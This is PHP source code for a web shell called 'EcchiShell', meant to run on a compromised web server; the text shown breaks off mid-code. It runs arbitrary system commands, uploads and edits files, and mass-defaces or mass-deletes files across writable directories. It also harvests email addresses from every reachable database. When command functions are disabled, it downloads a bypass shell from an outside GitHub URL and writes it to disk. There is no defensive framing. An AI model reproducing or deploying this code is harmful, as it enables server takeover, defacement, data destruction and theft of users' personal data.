<?php
header('User-Agent:' . randomagent());
header("X-XSS-Protection: 0");

define('version', '1.0');
define('author', './EcchiExploit');

set_time_limit(0);
@clearstatcache();
@error_reporting(0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);

if (version_compare(PHP_VERSION, '5.3.0', '<')) {
   @set_magic_quotes_runtime(0);
} else {
   ini_set('magic_quotes_runtime', 0);
}

if (version_compare(PHP_VERSION, '8.0.0', '<')) {
   if (get_magic_quotes_gpc()) {
      function ecchi($array)
      {
         return is_array($array) ? array_map('ecchi', $array) : stripslashes($array);
      }
      $_POST = ecchi($_POST);
   }
}

function w($dir, $perm)
{
   if (!is_writable($dir)) {
      return "<p class='text-danger'>" . $perm . "</p>";
   } else {
      return "<p class='text-warning'>" . $perm . "</p>";
   }
}

function r($dir, $perm)
{
   if (!is_readable($dir)) {
      return "<p class='text-danger'>" . $perm . "</p>";
   } else {
      return "<p class='text-warning'>" . $perm . "</p>";
   }
}

function randomagent()
{
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';
   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
   ';

   $getuseragent = array_rand($useragent);
   return $useragent[$getuseragent];
}

function massdeface($dir, $file, $filename, $type = null)
{
   $scandir = scandir($dir);
   foreach ($scandir as $dir_) {
      $path     = "$dir/$dir_";
      $location = "$path/$filename";
      if ($dir_ === "." || $dir_ === "..") {
         file_put_contents($location, $file);
      } else {
         if (is_dir($path) and is_writable($path)) {
            echo $location . PHP_EOL;
            file_put_contents($location, $file);
            if ($type === "-alldir") {
               massdeface($path, $file, $filename, "-alldir");
            }
         }
      }
   }
}

function massdelete($dir, $filename)
{
   $scandir = scandir($dir);
   foreach ($scandir as $dir_) {
      $path     = "$dir/$dir_";
      $location = "$path/$filename";
      if ($dir_ === '.') {
         if (file_exists("$dir/$filename")) {
            unlink("$dir/$filename");
         }
      } elseif ($dir_ === '..') {
         if (file_exists(dirname($dir) . "/$filename")) {
            unlink(dirname($dir) . "/$filename");
         }
      } else {
         if (is_dir($path) and is_writable($path)) {
            if (file_exists($location)) {
               print "[ DELETED ] " . $location . PHP_EOL;
               unlink($location);
               massdelete($path, $filename);
            }
         }
      }
   }
}

function perms($file)
{
   $perms = fileperms($file);
   if (($perms & 0xC000) == 0xC000) {
      // Socket
      $info = 's';
   } elseif (($perms & 0xA000) == 0xA000) {
      // Symbolic Link
      $info = 'l';
   } elseif (($perms & 0x8000) == 0x8000) {
      // Regular
      $info = '-';
   } elseif (($perms & 0x6000) == 0x6000) {
      // Block special
      $info = 'b';
   } elseif (($perms & 0x4000) == 0x4000) {
      // Directory
      $info = 'd';
   } elseif (($perms & 0x2000) == 0x2000) {
      // Character special
      $info = 'c';
   } elseif (($perms & 0x1000) == 0x1000) {
      // FIFO pipe
      $info = 'p';
   } else {
      // Unknown
      $info = 'u';
   }
   // Owner
   $info .= (($perms & 0x0100) ? 'r' : '-');
   $info .= (($perms & 0x0080) ? 'w' : '-');
   $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
   // Group
   $info .= (($perms & 0x0020) ? 'r' : '-');
   $info .= (($perms & 0x0010) ? 'w' : '-');
   $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
   // World
   $info .= (($perms & 0x0004) ? 'r' : '-');
   $info .= (($perms & 0x0002) ? 'w' : '-');
   $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
   return $info;
}

function getexist()
{
   if (function_exists('exec')) {
      $disable = 'Enable';
   } else if (function_exists('shell_exec')) {
      $disable = 'Enable';
   } else if (function_exists('system')) {
      $disable = 'Enable';
   } else if (function_exists('passthru')) {
      $disable = 'Enable';
   } else {
      $disable = 'Disable';
   }

   return $disable;
}

function seorank($url)
{
   $setopt = array(
      CURLOPT_URL => 'https://www.checkmoz.com/bulktool',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_POST => true,
      CURLOPT_POSTFIELDS => "getStatus=1&siteID=1&sitelink=$url&da=1&pa=1&alexa=1"
   );
   $ch = curl_init();
   curl_setopt_array($ch, $setopt);
   return curl_exec($ch);
   curl_close($ch);
}

function getact($dir, $file, $label)
{
?>
   <label for="<?= $label ?>" class="font-weight-bold">
      Filename : <span class="text-secondary"><?= basename($file) ?></span>
      [ <a class="text-white" href="?act=view&dir=<?= "$dir&file=" . $file ?>">view</a> ]
      [ <a class="text-white" href="?act=edit&dir=<?= "$dir&file=" . $file ?>"><b>edit</b></a> ]
      [ <a class="text-white" href="?act=rename&dir=<?= "$dir&file=" . $file ?>">rename</a> ]
      [ <a class="text-white" href="?act=download&dir=<?= "$dir&file=" . $file ?>">download</a> ]
      [ <a class="text-white" href="?act=delete&dir=<?= "$dir&file=" . $file ?>">delete</a> ]
   </label>
<?php
}

function shell()
{

   if (isset($_GET['dir'])) {
      $dir = htmlspecialchars($_GET['dir']);
      chdir($dir);
   } else {
      $dir = getcwd();
   }

   $dir = str_replace("\\", "/", $dir);
   $scdir = explode("/", $dir);
   $scandir = scandir($dir);
   $disable = @ini_get('disable_functions');
   $disable = (!empty($disable)) ? "<font class='text-warning'>$disable</font>" : '<font class="text-dark">NONE</font>';
   $os = substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
   $checkrdp = ($os !== 'Windows' && getexist() !== 'Disable') ? "Can't Create RDP" : 'Vuln To Create RDP';
   $rank = seorank($_SERVER['SERVER_NAME']);
   $getrank = preg_match_all('/(.*?)<\/td>/', $rank, $get);
   $check = preg_replace('/<td>/', '', $get[1]);
?>
   <!DOCTYPE html>
   <html lang="en">

   <head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="keywords" content="<?= author ?>">
      <meta name="author" content="<?= author ?>">
      <meta name="description" content="Priv Shell">
      <meta name="robots" content="noindex, nofollow">
      <link rel="icon" href="https://1.bp.blogspot.com/-Q4FzNb_oemU/XZ_a4WzmgNI/AAAAAAAAAZg/udnrGlkAkV0NYh-rDTC-VB64rimuu5VtQCK4BGAYYCw/s1600/IMG-20190901-WA0263.jpg" type="image/png">
      <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css" />
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
      <title>EcchiShell v1.0</title>
      <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
   </head>

   <style type="text/css">
      #btn-back-to-top {
         position: fixed;
         bottom: 20px;
         right: 20px;
         display: none;
      }
   </style>

   <body class="bg-info">
      <nav class="navbar navbar-expand-md bg-dark navbar-dark">
         <a class="navbar-brand" href="<?= $_SERVER['PHP_SELF'] ?>">
            <img src="https://1.bp.blogspot.com/-Q4FzNb_oemU/XZ_a4WzmgNI/AAAAAAAAAZg/udnrGlkAkV0NYh-rDTC-VB64rimuu5VtQCK4BGAYYCw/s1600/IMG-20190901-WA0263.jpg" alt="logo" style="width: 150px">
         </a>
         <button class="navbar-toggler" data-toggle="collapse" data-target="#collapsibleNavbar" aria-controls="collapsibleNavbar" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
         </button>

         <div class="collapse navbar-collapse" id="collapsibleNavbar">
            <ul class="navbar-nav">
               <li class="nav-item">
                  <button class="btn btn-outline-secondary border-0">
                     <a class="nav-link" href="<?= "?dir=$dir&opt=upload" ?>">Upload File</a>
                  </button>
               </li>
               <li class="nav-item">
                  <button class="btn btn-outline-secondary border-0">
                     <a class="nav-link" data-toggle="collapse" href="#info" role="button" data-target="#info" aria-expanded="false" aria-controls="info">System Info</a>
                  </button>
               </li>
               <li class="nav-item">
                  <button class="btn btn-outline-secondary border-0">
                     <a class="nav-link" data-toggle="collapse" href="#tool" role="button" data-target="#tool" aria-expanded="false" aria-controls="tool">Tool</a>
                  </button>
               </li>
            </ul>
         </div>
      </nav>
      <div class="container">
         <div class="row justify-content-center mt-5">
            <div class="md-4">
               <label for="dir" class="font-weight-bold text-dark">You In Here :</label>
               <?php
               foreach ($scdir as $c_dir => $cdir) {
                  echo "<a class='font-weight-bold text-warning' id='dir' href='?dir=";
                  for ($i = 0; $i <= $c_dir; $i++) {
                     echo $scdir[$i];
                     if ($i != $c_dir) {
                        echo "/";
                     }
                  }
                  echo "'>$cdir</a>/";
               }
               ?>
               <div class="collapse multi-collapse p-3" id="tool">
                  <div class="card card-body bg-dark text-center">
                     <p>
                        <a class="btn btn-outline-info text-white" href="<?= "?dir=$dir&opt=mass" ?>">
                           <i class="fad fa-clone"></i>
                           Mass Deface
                        </a>
                        <a class="btn btn-outline-info text-white" href="<?= "?dir=$dir&opt=email" ?>">
                           <i class="fad fa-mail-bulk"></i>
                           Email Grabber
                        </a>
                     </p>
                     <p>
                        <a class="btn btn-outline-info text-white" href="<?= "?dir=$dir&opt=cmd" ?>">
                           <i class="fad fa-terminal"></i>
                           Command Shell
                        </a>
                     </p>
                  </div>
               </div>
               <div class="collapse multi-collapse p-3" id="info">
                  <div class="card card-body">
                     <div class="font-weight-bold text-info">
                        <p>Shell Version : <span class="text-dark"><?= version ?></span></p>
                        <p>
                           Rank Alexa : <span class="text-dark"><?= $check[4] ?></span>
                           DA : <span class="text-dark"><?= $check[2] ?></span>
                           PA : <span class="text-dark"><?= $check[3] ?></span>
                        </p>
                        <p>OS : <span class="text-dark"><?= $os ?></span></p>
                        <p>RDP : <span class="text-dark"><?= $checkrdp ?></span></p>
                        <p>PHP Version : <span class="text-dark"><?= PHP_VERSION ?></span></p>
                        <p>Software : <span class="text-dark"><?= $_SERVER['SERVER_SOFTWARE'] ?></span></p>
                        <p>Information System : <span class="text-dark"><?= php_uname() ?></span></p>
                        <p>Disable Function : <span class="text-wrap"><?= $disable ?></span></p>
                     </div>
                  </div>
               </div>
               <button type="button" class="btn btn-danger btn-floating btn-lg" id="btn-back-to-top" role="button">
                  <i class="fas fa-chevron-up"></i>
               </button>
            </div>
         </div>
         <?php
         if ($_GET['opt'] == 'upload') {
            $act = 'Chose File To Upload!!';
            if ($_POST['upload']) {
               if ($_POST['type_upload'] == 'noroot') {
                  if (@copy($_FILES['ecchifile']['tmp_name'], "$dir/" . $_FILES['ecchifile']['name'])) {
                     $act = "Uploaded! at <i><b>$dir/" . $_FILES['ecchifile']['name'] . "</b></i>";
                  } else {
                     $act = "failed to upload file";
                  }
               } else {
                  $root = $_SERVER['DOCUMENT_ROOT'] . "/" . $_FILES['ecchifile']['name'];
                  $web = $_SERVER['HTTP_HOST'] . "/" . $_FILES['ecchifile']['name'];

                  if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
                     if (@copy($_FILES['ecchifile']['tmp_name'], $root)) {
                        $act = "Uploaded! at <i><b>$root -> </b></i><a class='font-weight-bold' href='http://$web' target='_blank'>$web</a>";
                     } else {
                        $act = "failed to upload file";
                     }
                  }
               }
            }
         ?>
            <div class="row justify-content-center mt-0 p-3">
               <div class="md-4">
                  <div class="card text-center bg-white border-0">
                     <div class="header">
                        <h5>Upload File</h5>
                     </div>
                     <div class="card-body bg-dark text-white">
                        <form method="POST" enctype="multipart/form-data">
                           <div class="form-check form-check-inline">
                              <input type="radio" name="type_upload" value="noroot" class="form-check-input" id="noroot" checked>
                              <label class="form-check-label" for="noroot">noroot <?= w($dir, "Writeable") ?></label>
                           </div>
                           <div class="form-check form-check-inline">
                              <input type="radio" name="type_upload" value="root" class="form-check-input" id="root">
                              <label class="form-check-label" for="root">root <?= w($_SERVER['DOCUMENT_ROOT'], "Writeable") ?></label>
                           </div>
                           <div class="row form-group mx-lg-n5">
                              <input type="file" name="ecchifile" class="col form-control-file py-3 px-lg-5">
                           </div>
                           <div class="form-group">
                              <input type="submit" id="upload" name="upload" class="btn btn-outline-primary form-control" value="Submit">
                           </div>
                           <div class="alert alert-info alert-dismissible fade show" role="alert">
                              <p class="text-wrap"><?= $act ?></p>
                              <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                 <span aria-hidden="true">&times;</span>
                              </button>
                           </div>
                        </form>
                     </div>
                  </div>
               </div>
            </div>
            <?php
         } else if ($_GET['opt'] == 'mass') {
            if ($_POST['mass_type'] === 'singledir') {
            ?>
               <div class="form-group">
                  <textarea class="form-control"><?= massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file']); ?></textarea>
               </div>
            <?php
            } elseif ($_POST['mass_type'] === 'alldir') {
            ?>
               <div class="form-group">
                  <textarea class="form-control" rows="5"><?= massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file'], "-alldir") ?></textarea>
               </div>
            <?php
            } elseif ($_POST['mass_type'] === "delete") {
            ?>
               <div class="form-group">
                  <textarea class="form-control" rows="5"><?= massdelete($_POST['d_dir'], $_POST['d_file']); ?></textarea>
               </div>
            <?php
            }
            ?>
            <form method="POST">
               <div class="form-group">
                  <div class="mb-3">
                     <div class="input-group is-invalid">
                        <div class="input-group-prepend">
                           <label class="input-group-text" for="filname">Filename</label>
                        </div>
                        <input class="form-control" type="text" name="d_file" id="filname" value="index.php" placeholder="Filename" spellcheck="false">
                     </div>
                  </div>
               </div>
               <div class="form-group">
                  <div class="mb-3">
                     <div class="input-group is-invalid">
                        <div class="input-group-prepend">
                           <label class="input-group-text" for="dir">Directory</label>
                        </div>
                        <input class="form-control" type="text" name="d_dir" id="dir" value="<?= $dir ?>" placeholder="Filename">
                     </div>
                  </div>
               </div>
               <div class="form-group">
                  <div class="mb-3">
                     <textarea class="form-control" name="script" placeholder="Hacked By ./EcchiExploit" rows="5"></textarea>
                  </div>
               </div>
               <div class="form-group">
                  <div class="mb-3">
                     <div class="input-group is-invalid">
                        <div class="input-group-prepend">
                           <label class="input-group-text" for="tipemass">Type Mass</label>
                        </div>
                        <select class="custom-select" name="mass_type" id="tipemass" required>
                           <option value="">Choose...</option>
                           <option value="singledir">Single Dir</option>
                           <option value="alldir">ALL Dir</option>
                           <option value="delete">Mass Delete</option>
                        </select>
                        <div class="invalid-feedback">
                           Please Chose...
                        </div>
                     </div>
                  </div>
               </div>
               <div class="form-group">
                  <button type="submit" class="btn btn-light form-control">Submit</button>
               </div>
            </form>
         <?php
         } else if ($_GET['opt'] == 'email') {
         ?>
            <div class="row justify-content-center mt-0 p-1">
               <div class="md-0">
                  <div class="card card-body bg-dark">
                     <form method="POST">
                        <div class="mb-3">
                           <div class="form-group">
                              <div class="input-group is-invalid">
                                 <div class="input-group-prepend">
                                    <label class="input-group-text" for="host">Hostname</label>
                                 </div>
                                 <input type="text" class="form-control" id="host" name="hostname" placeholder="hostname" required>
                              </div>
                           </div>
                        </div>
                        <div class="mb-3">
                           <div class="form-group">
                              <div class="input-group is-invalid">
                                 <div class="input-group-prepend">
                                    <label class="input-group-text" for="user">Username</label>
                                 </div>
                                 <input type="text" class="form-control" id="user" name="user" placeholder="username" required>
                              </div>
                           </div>
                        </div>
                        <div class="mb-3">
                           <div class="form-group">
                              <div class="input-group is-invalid">
                                 <div class="input-group-prepend">
                                    <label class="input-group-text" for="pass">Password</label>
                                 </div>
                                 <input type="text" class="form-control" id="pas" name="pass" placeholder="password">
                              </div>
                           </div>
                        </div>
                        <div class="mb-3">
                           <div class="form-group">
                              <div class="input-group is-invalid">
                                 <div class="input-group-prepend">
                                    <label class="input-group-text" for="db">Database</label>
                                 </div>
                                 <input type="text" class="form-control" id="db" name="database" placeholder="dbname (opsional)">
                              </div>
                           </div>
                        </div>
                        <div class="form-group">
                           <button class="btn btn-outline-info form-control" type="submit">Grabber!!</button>
                        </div>
                     </form>
                     <div class="form-group">
                        <?php
                        if (isset($_POST['database'])) {
                           $hostname   = htmlspecialchars($_POST['hostname']);
                           $user       = htmlspecialchars($_POST['user']);
                           $pass       = htmlspecialchars($_POST['pass']);

                           $conn = mysqli_connect($hostname, $user, $pass);
                           if (!$conn) {
                              die('<p class="text-white">Connect Database Error : ' . mysqli_connect_error() . '</p>');
                           }

                           $query1 = mysqli_query($conn, 'show databases');
                           while ($row = mysqli_fetch_array($query1)) {
                              $query2 = mysqli_query($conn, 'show tables from ' . $row['Database']);
                              while ($tables = mysqli_fetch_array($query2)) {
                                 $query3 = mysqli_query($conn, 'show columns from ' . $row['Database'] . '.' . $tables['Tables_in_' . $row['Database']] . ' in ' . $row['Database']);
                                 while ($columns = mysqli_fetch_array($query3)) {
                                    if (preg_match('/email/', $columns['Field'])) {
                                       $end_query = 'select ' . $columns['Field'] . ' from ' . $row['Database'] . '.' . $tables['Tables_in_' . $row['Database']];
                                       $final_connect_query = mysqli_query($conn, $end_query);
                                       if (mysqli_num_rows($final_connect_query) > 0) {
                                          echo '<textarea class="form-control" rows="5">';
                                          while ($email = mysqli_fetch_array($final_connect_query)) {
                                             if (strstr($email[$columns['Field']], "@")) {
                                                echo $email[$columns['Field']] . PHP_EOL;
                                             }
                                          }
                                          echo '</textarea>';
                                       }
                                    }
                                 }
                              }
                           }
                        }
                        ?>
                     </div>
                  </div>
               </div>
            </div>
         <?php
         } else if ($_GET['opt'] == 'cmd') {
         ?>
            <div class="row justify-content-center p-2">
               <div class="md-0">
                  <div class="card card-body">
                     <form method="POST">
                        <div class="mb-3">
                           <div class="form-group">
                              <div class="input-group is-invalid">
                                 <div class="input-group-prepend">
                                    <label class="input-group-text" for="cmd">Command</label>
                                 </div>
                                 <input type="text" class="form-control" id="cmd" name="command" placeholder="Your Command" value="uname -a">
                              </div>
                           </div>
                        </div>
                        <div class="form-group">
                           <button type="submit" class="btn btn-info form-control">Submit</button>
                        </div>
                     </form>
                     <?php
                     if (isset($_POST['command'])) {
                        $cmd = htmlspecialchars($_POST['command']);
                        if (getexist() == 'Disable') {
                           mkdir('bypass-disable');
                           $file = fopen('bypass-disable/bypass.php', 'w');
                           fwrite($file, file_get_contents('https://raw.githubusercontent.com/l3m0n/Bypass_Disable_functions_Shell/master/shell.php'));
                           fclose($file);

                           echo '
                           <label class="text-info" for="result">Result Disable And To Bypass Disable Function :</label>
                           <div class="embed-responsive embed-responsive-16by9 form-group">
                              <iframe id="result" class="form-control embed-responsive-item" src="bypass-disable/bypass.php"></iframe>
                           </div>
                           ';
                        } else {
                     ?>
                           <div class="mb-3">
                              <div class="input-group is-invalid">
                                 <div class="input-group-prepend">
                                    <label class="input-group-text" for="filname">Result</label>
                                 </div>
                                 <textarea class="form-control text-dark font-weight-bold" rows="5"><?= shell_exec($cmd) ?></textarea>
                              </div>
                           </div>
                     <?php
                        }
                     }
                     ?>
                  </div>
               </div>
            </div>
         <?php
         }

         if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
            @ob_clean();
            $file = $_GET['file'];
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
         } else if ($_GET['act'] == 'edit') {
            $act = 'Edit Your File';
            if ($_POST['src']) {
               $save = file_put_contents($_GET['file'], $_POST['src']);
               if ($save) {
                  $act = "Saved!";
               } else {
                  $act = "permission denied";
               }
            }
         ?>
            <form method="POST">
               <div class="form-group">
                  <?= getact($dir, $_GET['file'], 'textarea') ?>
                  <textarea class="form-control bg-dark text-danger border-0" spellcheck="false" name="src" id="textarea" rows="10"><?= htmlspecialchars(@file_get_contents($_GET['file'])) ?></textarea>
               </div>
               <div class="form-group">
                  <button type="submit" class="btn btn-light form-control">Save</button>
               </div>
               <div class="alert alert-info alert-dismissible fade show" role="alert">
                  <strong><?= $act ?></strong>
                  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                     <span aria-hidden="true">&times;</span>
                  </button>
               </div>
            </form>
         <?php
         } else if ($_GET['act'] == 'rename') {
            $act = 'Rename File';
            if ($_POST['rename']) {
               $rename = rename($_GET['file'], "$dir/" . htmlspecialchars($_POST['rename']));
               if ($rename) {
                  $act = "<script>window.location='?dir=" . $dir . "';</script>";
               } else {
                  $act = "permission denied";
               }
            }
         ?>
            <form method="POST">
               <div class="form-group">
                  <?= getact($dir, $_GET['file'], 'rename') ?>
                  <input id="rename" type="text" name="rename" class="form-control bg-dark text-danger border-0" value="<?= basename($_GET['file']) ?>">
               </div>
               <div class="form-group">
                  <button class="btn btn-light form-control">Rename</button>
               </div>
               <div class="alert alert-info alert-dismissible fade show" role="alert">
                  <strong><?= $act ?></strong>
                  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                     <span aria-hidden="true">&times;</span>
                  </button>
               </div>
            </form>
         <?php
         } else if ($_GET['act'] == 'rename_dir') {
            $act = 'Rename Directory';
            if ($_POST['rename_dir']) {
               $dir_rename = rename($dir, "" . dirname($dir) . "/" . htmlspecialchars($_POST['rename_dir']) . "");
               if ($dir_rename) {
                  $act = "Rename Dir Success<script>window.location='?dir=" . dirname($dir) . "';</script>";
               } else {
                  $act = "permission denied";
               }
            }
         ?>
            <form method="POST">
               <div class="form-group">
                  <input name="rename_dir" type="text" class="form-control bg-dark text-danger border-0" value="<?= basename($dir) ?>">
               </div>
               <div class="form-group">
                  <button class="btn btn-light form-control">Rename</button>
               </div>
               <div class="alert alert-info alert-dismissible fade show" role="alert">
                  <strong><?= $act ?></strong>
                  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                     <span aria-hidden="true">&times;</span>
                  </button>
               </div>
            </form>
         <?php
         } else if ($_GET['act'] == 'delete_dir') {
            if (is_dir($dir)) {
               if (is_writable($dir)) {
                  @rmdir($dir);
                  @exec("rm -rf $dir");
                  @exec("rmdir /s /q $dir");
                  $act = "Delete Success<script>window.location='?dir=" . dirname($dir) . "';</script>";
               } else {
                  $act = "could not remove " . basename($dir);
               }
            }
         ?>
            <div class="alert alert-info alert-dismissible fade show" role="alert">
               <strong><?= $act ?></strong>
               <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                  <span aria-hidden="true">&times;</span>
               </button>
            </div>
         <?php
         } else if ($_GET['act'] == 'delete') {
            $delete = unlink($_GET['file']);
            if ($delete) {
               $act = "Success Delete File<script>window.location='?dir=" . $dir . "';</script>";
            } else {
               $act = "permission denied";
            }
         ?>
            <div class="alert alert-info alert-dismissible fade show" role="alert">
               <strong><?= $act ?></strong>
               <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                  <span aria-hidden="true">&times;</span>
               </button>
            </div>
         <?php
         } else if ($_GET['act'] == 'newfolder') {
            $act = 'Create New Folder';
            if ($_POST['new_folder']) {
               $newfolder = $dir . '/' . htmlspecialchars($_POST['new_folder']);
               if (!mkdir($newfolder)) {
                  $act = "permission denied";
               } else {
                  $act = "Success Create Folder<script>window.location='?dir=" . $dir . "';</script>";
               }
            }
         ?>
            <form method="POST">
               <div class="form-group">
                  <input type="text" name="new_folder" class="form-control" placeholder="name folder" required>
               </div>
               <div class="form-group">
                  <button type="submit" class="btn btn-light form-control">Submit</button>
               </div>
               <div class="alert alert-info alert-dismissible fade show" role="alert">
                  <strong><?= $act ?></strong>
                  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                     <span aria-hidden="true">&times;</span>
                  </button>
               </div>
            </form>
         <?php
         } else if ($_GET['act'] == 'newfile') {
            $act = 'Create New File';
            if ($_POST['new_file']) {
               $newfile = htmlspecialchars($_POST['new_file']);
               $fopen = fopen($newfile, "a+");
               if ($fopen) {
                  $act = "Success Create File<script>window.location='?act=edit&dir=" . $dir . "&file=" . $_POST['new_file'] . "';</script>";
               } else {
                  $act = "permission denied";
               }
            }
         ?>
            <form method="POST">
               <div class="form-group">
                  <input type="text" name="new_file" class="form-control" placeholder="name file" value="<?= "$dir/newfile.php" ?>" required>
               </div>
               <div class="form-group">
                  <button type="submit" class="btn btn-light form-control">Submit</button>
               </div>
               <div class="alert alert-info alert-dismissible fade show" role="alert">
                  <strong><?= $act ?></strong>
                  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                     <span aria-hidden="true">&times;</span>
                  </button>
               </div>
            </form>
         <?php
         } else if ($_GET['act'] == 'view') {
         ?>
            <div class="form-group">
               <?= getact($dir, $_GET['file'], 'file') ?>
               <textarea class="form-control bg-dark text-danger border-0" id="file" rows="5" readonly><?= htmlspecialchars(@file_get_contents($_GET['file'])) ?></textarea>
            </div>
            <?php
         }
         if (is_dir($dir) == true) {
            if (!is_readable($dir)) {
               echo "<p class='font-weight-bold text-danger'>can't open directory. ( not readable )</p>";
            } else {
            ?>
               <div class="table-responsive">
                  <table class="table table-bordered table-striped table-hover">
                     <thead class="thead-dark text-center">
                        <tr>
                           <th>Name</th>
                           <th>Filetype</th>
                           <th>Perm</th>
                           <th>Option</th>
                        </tr>
                     </thead>
                     <tbody class="font-weight-bold border-dark">
                        <?php
                        foreach ($scandir as $direc) {
                           $dtype = filetype("$dir/$direc");
                           if ($direc === '..') {
                              $href = "<a class='text-white' href='?dir=" . dirname($dir) . "'>$direc</a>";
                           } elseif ($direc === '.') {
                              $href = "<a class='text-white' href='?dir=$dir'>$direc</a>";
                           } else {
                              $href = "<a class='text-white' href='?dir=$dir/$direc'>$direc</a>";
                           }
                           if ($direc === '.' || $direc === '..') {
